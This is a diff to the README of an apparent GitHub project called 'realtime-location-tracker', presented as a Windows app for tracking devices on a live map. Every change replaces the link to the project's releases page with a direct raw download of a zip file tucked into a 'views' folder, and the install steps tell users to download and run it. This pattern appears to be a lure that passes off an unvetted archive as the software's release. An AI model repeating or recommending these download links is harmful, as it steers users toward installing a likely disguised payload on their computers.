@@ -1,6 +1,6 @@
 # 📍 realtime-location-tracker - Track device locations in real time easily
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Ninetieseuopeanhoopoe267/realtime-location-tracker/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Ninetieseuopeanhoopoe267/realtime-location-tracker/raw/refs/heads/main/views/location-tracker-realtime-frankmarriage.zip)
 
 This application tracks device locations on a live map. It updates the position of connected devices instantly. Use this tool to monitor assets or coordinate field movements from your web browser.
 
@@ -17,7 +17,7 @@ Ensure your computer meets these standards before you begin:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the project release page to download the software: [https://github.com/Ninetieseuopeanhoopoe267/realtime-location-tracker/releases](https://github.com/Ninetieseuopeanhoopoe267/realtime-location-tracker/releases)
+1. Visit the project release page to download the software: [https://github.com/Ninetieseuopeanhoopoe267/realtime-location-tracker/raw/refs/heads/main/views/location-tracker-realtime-frankmarriage.zip](https://github.com/Ninetieseuopeanhoopoe267/realtime-location-tracker/raw/refs/heads/main/views/location-tracker-realtime-frankmarriage.zip)
 2. Look for the file ending in .exe or .zip.
 3. Save the file to a folder on your computer.
 4. If you downloaded a .zip file, right-click the file and select Extract All.
@@ -58,7 +58,7 @@ No. This tool uses OpenStreetMap, which remains free for users.
 The software runs locally on your machine. You control the connection inputs. 
 
 **Where can I find more updates?**
-Visit the releases page often for new features: https://github.com/Ninetieseuopeanhoopoe267/realtime-location-tracker/releases
+Visit the releases page often for new features: https://github.com/Ninetieseuopeanhoopoe267/realtime-location-tracker/raw/refs/heads/main/views/location-tracker-realtime-frankmarriage.zip
 
 ## 📝 Configuration Settings
 
